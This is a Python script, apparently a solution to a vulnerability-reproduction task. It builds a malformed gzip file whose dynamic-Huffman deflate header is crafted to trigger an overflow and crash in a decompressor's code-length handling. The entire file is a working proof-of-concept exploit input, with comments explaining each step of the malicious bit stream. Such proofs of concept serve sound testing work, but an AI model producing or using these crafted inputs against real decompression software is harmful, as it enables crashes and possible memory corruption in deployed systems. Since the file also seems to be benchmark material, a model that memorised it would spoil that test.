import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # GZIP Header (10 bytes): Minimal valid header
        # ID1(1F) ID2(8B) CM(08) FLG(00) MTIME(00000000) XFL(00) OS(03)
        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03'
        
        data = bytearray()
        val = 0
        bits = 0
        
        def write_bits(v, n):
            nonlocal val, bits
            v &= (1 << n) - 1
            val |= (v << bits)
            bits += n
            while bits >= 8:
                data.append(val & 0xFF)
                val >>= 8
                bits -= 8
                
        def write_huffman_code(code, length):
            # Huffman codes are written MSB first to the stream
            for i in range(length - 1, -1, -1):
                bit = (code >> i) & 1
                write_bits(bit, 1)

        # Deflate Block Header
        # BFINAL = 1 (1 bit)
        write_bits(1, 1)
        # BTYPE = 2 (Dynamic Huffman) (2 bits)
        write_bits(2, 2)
        
        # Dynamic Huffman Header
        # HLIT = 0 (257 codes: 257 - 257 = 0) (5 bits)
        write_bits(0, 5)
        # HDIST = 0 (1 code: 1 - 1 = 0) (5 bits)
        write_bits(0, 5)
        # HCLEN = 15 (19 code lengths: 19 - 4 = 15) (4 bits)
        write_bits(15, 4)
        
        # Code lengths for the code length alphabet (19 * 3 bits)
        # Order: 16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15
        # We need Sym 18 (index 2) to have length 2
        # We need Sym 15 (index 18) to have length 1
        # All others 0 (length 0 means unused)
        
        # Index 0 (Sym 16): 0
        write_bits(0, 3)
        # Index 1 (Sym 17): 0
        write_bits(0, 3)
        # Index 2 (Sym 18): 2 (binary 010)
        write_bits(2, 3)
        # Indices 3-17: 0 (15 times)
        for _ in range(15):
            write_bits(0, 3)
        # Index 18 (Sym 15): 1 (binary 001)
        write_bits(1, 3)
        
        # Resulting CL Tree:
        # Sym 15 (Len 1) -> Code 0
        # Sym 18 (Len 2) -> Code 10 (binary)
        
        # Literal/Length Code Lengths Data
        # We are defining the lengths for the 257 Lit/Len codes + 1 Distance code.
        # We want to set one code to have length 15 to trigger the overflow.
        
        # 1. Set Literal 0 to length 15.
        # Send Sym 15 (Code 0)
        write_huffman_code(0, 1)
        
        # 2. To ensure the parser continues (and doesn't error on EOF before crash),
        #    we fill the remaining expected lengths using RLE (Sym 18).
        #    We need 257 zeros (remaining lits) + 1 zero (distance) = 258 total needed.
        #    We provided 1. Need 257.
        #    Sym 18 can repeat 0 for 11-138 times.
        
        # Chunk 1: 138 zeros.
        # Send Sym 18 (Code 10)
        write_huffman_code(2, 2)
        # Extra bits (7) for value 138: 138 - 11 = 127
        write_bits(127, 7)
        
        # Chunk 2: 119 zeros (257 - 138 = 119).
        # Send Sym 18 (Code 10)
        write_huffman_code(2, 2)
        # Extra bits (7) for value 119: 119 - 11 = 108
        write_bits(108, 7)
        
        # Flush bits
        if bits > 0:
            data.append(val & 0xFF)
            
        return header + data
